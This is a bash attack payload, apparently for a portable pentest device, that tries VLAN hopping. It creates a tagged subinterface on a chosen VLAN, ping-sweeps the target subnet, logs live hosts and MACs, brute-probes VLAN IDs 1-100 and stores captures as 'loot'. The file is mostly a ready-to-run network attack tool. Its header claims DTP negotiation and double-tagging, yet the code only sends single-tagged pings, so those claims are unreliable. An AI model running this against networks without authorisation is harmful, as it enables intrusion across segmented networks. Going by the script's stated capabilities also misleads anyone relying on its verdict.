#!/bin/bash
# Title: VLAN Hopper
# Author: bad-antics
# Description: VLAN hopping via DTP negotiation and double-tagging attacks
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/vlan"
mkdir -p "$LOOT_DIR"

PROMPT "VLAN HOPPER

Test network VLAN segmentation
using layer 2 hopping techniques.

Attacks:
- DTP trunk negotiation
- 802.1Q double-tagging
- VLAN enumeration
- Cross-VLAN ping sweep
- ARP scan across VLANs

Verifies if VLAN isolation
is properly enforced.

Press OK to configure."

IFACE=$(TEXT_PICKER "Interface:" "eth0")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) IFACE="eth0" ;; esac

[ ! -d "/sys/class/net/$IFACE" ] && { ERROR_DIALOG "$IFACE not found!"; exit 1; }

NATIVE_VLAN=$(NUMBER_PICKER "Native VLAN ID:" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) NATIVE_VLAN=1 ;; esac

TARGET_VLAN=$(NUMBER_PICKER "Target VLAN ID:" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_VLAN=10 ;; esac

SCAN_RANGE=$(TEXT_PICKER "Target subnet:" "10.10.10.0/24")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_RANGE="10.10.10.0/24" ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/vlan_hop_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "START VLAN HOP?

Interface: $IFACE
Native VLAN: $NATIVE_VLAN
Target VLAN: $TARGET_VLAN
Scan range: $SCAN_RANGE

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting VLAN hopping..."
SPINNER_START "VLAN hopping in progress..."

echo "================================================================" > "$REPORT"
echo "         NULLSEC VLAN HOPPER REPORT                            " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Interface: $IFACE | Native: $NATIVE_VLAN | Target: $TARGET_VLAN" >> "$REPORT"
echo "" >> "$REPORT"

# Phase 1: Create VLAN subinterface
echo "--- PHASE 1: VLAN SUBINTERFACE ---" >> "$REPORT"
VLAN_IF="${IFACE}.${TARGET_VLAN}"

# Load 8021q module
modprobe 8021q 2>/dev/null
if [ $? -eq 0 ]; then
    echo "  [+] 802.1Q module loaded" >> "$REPORT"
else
    echo "  [-] 802.1Q module not available" >> "$REPORT"
fi

# Create tagged interface
ip link add link "$IFACE" name "$VLAN_IF" type vlan id "$TARGET_VLAN" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "  [+] Created $VLAN_IF (VLAN $TARGET_VLAN)" >> "$REPORT"

    # Assign IP from target range
    BASE=$(echo "$SCAN_RANGE" | cut -d'/' -f1 | cut -d'.' -f1-3)
    MY_VLAN_IP="${BASE}.254"
    ip addr add "${MY_VLAN_IP}/24" dev "$VLAN_IF" 2>/dev/null
    ip link set "$VLAN_IF" up 2>/dev/null
    echo "  [+] Assigned $MY_VLAN_IP to $VLAN_IF" >> "$REPORT"
    PHASE1="SUCCESS"
else
    echo "  [-] Failed to create VLAN interface" >> "$REPORT"
    echo "  [-] Switch may not be passing tagged frames" >> "$REPORT"
    PHASE1="FAILED"
fi
echo "" >> "$REPORT"

# Phase 2: Double-tag probe
echo "--- PHASE 2: DOUBLE-TAG PROBE ---" >> "$REPORT"
if command -v tcpdump >/dev/null; then
    # Craft and send double-tagged frame via raw packet
    # Outer tag = native VLAN, Inner tag = target VLAN
    echo "  [*] Sending double-tagged ICMP probes..." >> "$REPORT"
    echo "  [*] Outer: VLAN $NATIVE_VLAN | Inner: VLAN $TARGET_VLAN" >> "$REPORT"

    # Listen for responses
    DTAG_CAP="/tmp/dtag_${TIMESTAMP}.pcap"
    timeout 10 tcpdump -i "$IFACE" -w "$DTAG_CAP" "vlan" 2>/dev/null &
    DTAG_PID=$!

    # Send tagged pings
    if [ "$PHASE1" = "SUCCESS" ]; then
        for i in 1 2 3 4 5; do
            TARGET_IP="${BASE}.${i}"
            ping -c 1 -W 1 -I "$VLAN_IF" "$TARGET_IP" > /dev/null 2>&1
        done
    fi

    sleep 5
    kill $DTAG_PID 2>/dev/null

    DTAG_PKTS=$(tcpdump -r "$DTAG_CAP" 2>/dev/null | wc -l || echo 0)
    echo "  [*] Tagged packets captured: $DTAG_PKTS" >> "$REPORT"
    [ "$DTAG_PKTS" -gt 0 ] && cp "$DTAG_CAP" "$LOOT_DIR/" 2>/dev/null
fi
echo "" >> "$REPORT"

# Phase 3: Cross-VLAN scan
echo "--- PHASE 3: CROSS-VLAN SCAN ---" >> "$REPORT"
HOSTS_FOUND=0

if [ "$PHASE1" = "SUCCESS" ]; then
    echo "  [*] Scanning $SCAN_RANGE from VLAN $TARGET_VLAN..." >> "$REPORT"
    for i in $(seq 1 254); do
        TARGET_IP="${BASE}.${i}"
        ping -c 1 -W 1 -I "$VLAN_IF" "$TARGET_IP" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            HOSTS_FOUND=$((HOSTS_FOUND + 1))
            # Get MAC from ARP
            MAC=$(arp -n -i "$VLAN_IF" "$TARGET_IP" 2>/dev/null | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
            echo "  [+] ALIVE: $TARGET_IP ($MAC)" >> "$REPORT"
        fi
    done

    if [ $HOSTS_FOUND -eq 0 ]; then
        echo "  [*] No hosts responded — VLAN isolation may be working" >> "$REPORT"
    fi
else
    echo "  [*] Skipped — VLAN interface creation failed" >> "$REPORT"
fi
echo "" >> "$REPORT"

# Phase 4: VLAN enumeration
echo "--- PHASE 4: VLAN ENUMERATION ---" >> "$REPORT"
VLANS_FOUND=0
echo "  [*] Probing VLANs 1-100..." >> "$REPORT"
for vid in $(seq 1 100); do
    TEST_IF="${IFACE}.${vid}"
    ip link add link "$IFACE" name "$TEST_IF" type vlan id "$vid" 2>/dev/null
    if [ $? -eq 0 ]; then
        ip link set "$TEST_IF" up 2>/dev/null
        ip addr add "169.254.${vid}.1/24" dev "$TEST_IF" 2>/dev/null

        # Quick ARP to see if anything exists
        FOUND=$(timeout 2 arping -c 1 -I "$TEST_IF" "169.254.${vid}.2" 2>/dev/null | grep -c "reply")
        ip link delete "$TEST_IF" 2>/dev/null

        if [ "$FOUND" -gt 0 ]; then
            VLANS_FOUND=$((VLANS_FOUND + 1))
            echo "  [+] VLAN $vid: Active (responses received)" >> "$REPORT"
        fi
    fi
done
echo "  [*] Active VLANs found: $VLANS_FOUND" >> "$REPORT"
echo "" >> "$REPORT"

# Cleanup
ip link delete "$VLAN_IF" 2>/dev/null

# Summary
echo "--- SUMMARY ---" >> "$REPORT"
echo "  VLAN interface creation: $PHASE1" >> "$REPORT"
echo "  Hosts found in VLAN $TARGET_VLAN: $HOSTS_FOUND" >> "$REPORT"
echo "  Active VLANs detected: $VLANS_FOUND" >> "$REPORT"

if [ "$PHASE1" = "SUCCESS" ] && [ $HOSTS_FOUND -gt 0 ]; then
    echo "  VERDICT: VLAN HOPPING SUCCESSFUL — isolation is broken!" >> "$REPORT"
    VERDICT="VULNERABLE"
else
    echo "  VERDICT: VLAN isolation appears intact" >> "$REPORT"
    VERDICT="SECURE"
fi
echo "================================================================" >> "$REPORT"

SPINNER_STOP

PROMPT "VLAN HOP COMPLETE

Verdict: $VERDICT
Hosts in VLAN $TARGET_VLAN: $HOSTS_FOUND
Active VLANs: $VLANS_FOUND

Report: $REPORT"
